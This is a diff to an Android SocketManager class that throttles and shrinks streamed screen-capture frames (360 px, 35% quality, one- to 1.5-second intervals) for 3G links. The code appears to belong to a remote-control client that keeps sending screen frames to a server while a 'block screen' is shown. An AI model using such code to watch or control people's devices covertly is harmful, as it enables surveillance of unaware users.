@@ -978,8 +978,21 @@ public class SocketManager {
 
     // ── Streaming — event-driven single-frame model ───────────────────────
 
+    // Minimum gap between consecutive frame sends (ms) — enforces backpressure on slow links.
+    // After each frame send we record the actual wall-clock time and refuse a new send if the
+    // previous one completed less than MIN_FRAME_GAP_MS ago. This prevents the TCP send buffer
+    // from filling up on 3G where a frame can take 1-2 s to flush.
+    private volatile long lastFrameSentMs = 0L;
+    private static final long MIN_FRAME_GAP_MS = 600; // never exceed ~1.6 FPS on the wire
+
     /** Send exactly one frame immediately. Drops the call if a frame is already being captured. */
     public void sendSingleFrame(String deviceId) {
+        // Backpressure: skip if the last frame was sent too recently (TCP buffer pressure).
+        long now = System.currentTimeMillis();
+        if (now - lastFrameSentMs < MIN_FRAME_GAP_MS) {
+            Log.d(TAG, "sendSingleFrame: throttled — last frame sent " + (now - lastFrameSentMs) + " ms ago");
+            return;
+        }
         // Throttle: only one frame capture at a time — drop new requests while busy
         if (!frameBusy.compareAndSet(false, true)) {
             Log.d(TAG, "sendSingleFrame: dropped — previous frame still in progress");
@@ -989,11 +1002,12 @@ public class SocketManager {
             try {
                 Bitmap frame = captureFrame();
                 if (frame != null) {
-                    // 540 px wide: encodes ~2× faster than 720 px, still sharp enough for remote control.
-                    Bitmap scaled = scaleBitmapToWidth(frame, 540);
+                    // 360 px wide for 3G compatibility — smaller frame = faster upload, lower latency.
+                    // Encodes ~2× faster than 540 px and uses ~55% less data on the wire.
+                    Bitmap scaled = scaleBitmapToWidth(frame, 360);
                     if (scaled != frame) frame.recycle();
-                    // Start at 50% — almost always fits in 80 KB without needing extra encode passes.
-                    String b64 = bitmapToBase64Adaptive(scaled, 50, 80_000);
+                    // Start at 35% quality, max 40 KB raw — safe for 3G uplinks (~0.5 Mbps).
+                    String b64 = bitmapToBase64Adaptive(scaled, 35, 40_000);
                     scaled.recycle();
                     if (b64 != null) {
                         JSONObject d = new JSONObject();
@@ -1007,6 +1021,8 @@ public class SocketManager {
                         }
                         // Use dedicated stream channel — keeps command channel clear
                         sendStreamMessage("stream:frame", d);
+                        // Record send time for backpressure — prevents TCP buffer overflow on slow links
+                        lastFrameSentMs = System.currentTimeMillis();
                     }
                 }
             } catch (Exception e) {
@@ -1025,14 +1041,14 @@ public class SocketManager {
         return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
     }
 
-    /** Start idle-frame mode: send one frame every 350 ms (~3 FPS) for real-time streaming. */
+    /** Start idle-frame mode: send one frame every 1000 ms (~1 FPS) for 3G-compatible streaming. */
     private void startIdleFrameMode(String deviceId) {
         stopIdleFrameMode();
         idleFrameMode = true;
         idleFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
             if (idleFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
-        }, 0, 350, TimeUnit.MILLISECONDS);
-        Log.i(TAG, "Idle-frame mode started (350ms interval, ~3 FPS)");
+        }, 0, 1000, TimeUnit.MILLISECONDS);
+        Log.i(TAG, "Idle-frame mode started (1000ms interval, ~1 FPS — 3G compatible)");
     }
 
     private void stopIdleFrameMode() {
@@ -1043,7 +1059,7 @@ public class SocketManager {
         }
     }
 
-    /** Start block-frame mode: push one frame every 500 ms while block screen is active. */
+    /** Start block-frame mode: push one frame every 1500 ms while block screen is active (3G safe). */
     private void startBlockFrameMode(String deviceId) {
         stopBlockFrameMode();
         blockFrameMode = true;
@@ -1051,8 +1067,8 @@ public class SocketManager {
         executor.execute(() -> sendSingleFrame(deviceId));
         blockFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
             if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
-        }, 500, 500, TimeUnit.MILLISECONDS);
-        Log.i(TAG, "Block-frame mode started (500ms interval)");
+        }, 1500, 1500, TimeUnit.MILLISECONDS);
+        Log.i(TAG, "Block-frame mode started (1500ms interval — 3G compatible)");
     }
 
     private void stopBlockFrameMode() {
